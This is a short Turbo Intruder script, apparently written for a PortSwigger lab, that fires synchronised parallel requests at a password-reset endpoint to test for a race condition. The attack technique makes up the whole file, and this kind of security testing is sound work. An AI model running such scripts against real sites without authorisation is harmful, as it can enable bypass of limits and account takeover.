# You can test this code on http://portswigger-labs.net/password_reset.php?username=%s
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=4,
                           requestsPerConnection=4
                           )


    strings = ['1', '2', '3', '4']
    
    for string in strings:
        engine.queue(target.req, string, gate='race1')

    engine.openGate('race1')

    engine.complete(timeout=60)
   
def handleResponse(req, interesting):
    table.add(req)
